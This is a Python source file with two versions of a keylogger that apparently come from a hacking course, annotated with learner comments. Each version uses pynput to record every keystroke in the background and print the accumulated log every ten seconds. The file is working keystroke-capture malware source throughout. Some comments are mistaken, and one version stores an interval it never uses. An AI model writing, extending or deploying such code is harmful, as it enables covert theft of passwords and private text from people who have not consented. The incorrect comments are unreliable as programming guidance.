#!/usr/bin/env python3

#need pynput - not preinstalled
#pip install pynput / pip3 install pynput

import pynput.keyboard
import threading

class Keylogger: #class names start with capital letter conventionally
    def __init__(self, time_interval): #create constructor method
        #any code under here will automatically be executed
        self.log = "" #create an attribute log
        self.interval = time_interval #value required to be passed to Keylogger when running from other code
        #ie my_keylogger = keylog.Keylogger(5) - passes interval of 5
        print("Constructor method")
        
    def append_to_log(self, string):
        self.log = self.log + string
        
    def process_keypress(self, key): #functions inside methods are classes
        try:
            current_key = str(key.char)
        except AttributeError: #AttributeError triggered if special char is used (Space, etc)
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        print(self.log)
        self.log = " "
        timer = threading.Timer(10, self.report) #recursive function - report calls itself
        timer.start()
    
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press = self.process_keypress)
        #create listener object from pynput and store as var
        #pass to process_keypress function defined above

        with keyboard_listener:
            self.report()
            keyboard_listener.join()

        #since there is no place to implement a reporting function,
        #need to do something like threading to have code running in the background without
        #interrupting the program's main functions

#==============================================================================
#!/usr/bin/env python3

#need pynput - not preinstalled
#pip install pynput / pip3 install pynput

import pynput.keyboard
import threading

#log = "" #init var for storing keystrokes
#put this under constructor method to initialize automatically

class Keylogger: #class names start with capital letter conventionally
    def __init__(self): #create constructor method
        self.log = "" #attribute
        print("Constructor method")
        #any code under here will automatically be executed
        
    def append_to_log(self, string):
        self.log = self.log + string
        
    def process_keypress(self, key): #functions inside methods are classes
        #global log #to define global variables
        #no longer needed if log is defined under constructor (self.log)
        try:
            #log = log + str(key.char) #key is of type KeyType and cannot be concat'ed
            #self.append_to_log(str(key.char))
            current_key = str(key.char)
        except AttributeError: #AttributeError triggered if special char is used (Space, etc)
            if key == key.space:
                current_key = " "
                #log = log + " " #print space rather than Key.space
            else:
                current_key = " " + str(key) + " "
                #log = log + " " + str(key) + " " #add space in between
        self.append_to_log(current_key)
    #print(key)
    #print(key.char)
    #print(log)

    def report(self):
        #global log
        #print(log)
        print(self.log)
        #log = "" - need to change to self.log
        self.log = " "
        timer = threading.Timer(10, self.report) #recursive function - report calls itself
        timer.start()
    
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press = self.process_keypress)
        #create listener object from pynput and store as var
        #pass to process_keypress function defined above

        with keyboard_listener:
            self.report()
            keyboard_listener.join()

        #since there is no place to implement a reporting function,
        #need to do something like threading to have code running in the background without
        #interrupting the program's main functions
